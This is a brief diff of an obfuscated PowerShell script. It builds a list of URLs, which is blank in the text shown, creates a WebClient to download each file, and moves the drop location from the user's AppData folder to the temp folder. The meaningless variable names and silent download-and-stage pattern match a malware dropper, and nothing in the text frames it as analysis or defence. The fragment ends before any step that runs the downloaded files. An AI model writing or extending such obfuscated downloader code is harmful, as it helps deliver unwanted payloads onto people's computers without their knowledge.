@@ -3,7 +3,7 @@ $terik = @(
     "",
     ""
 )
-$gkkwerf = [Environment]::GetFolderPath('ApplicationData')
+$gkkwerf = [Environment]::GetFolderPath('temp')
 $gdfQosoqwek = New-Object System.Net.WebClient
 foreach ($hyesos in $terik) {
     $dfowerfk = [System.IO.Path]::GetFileName($hyesos)
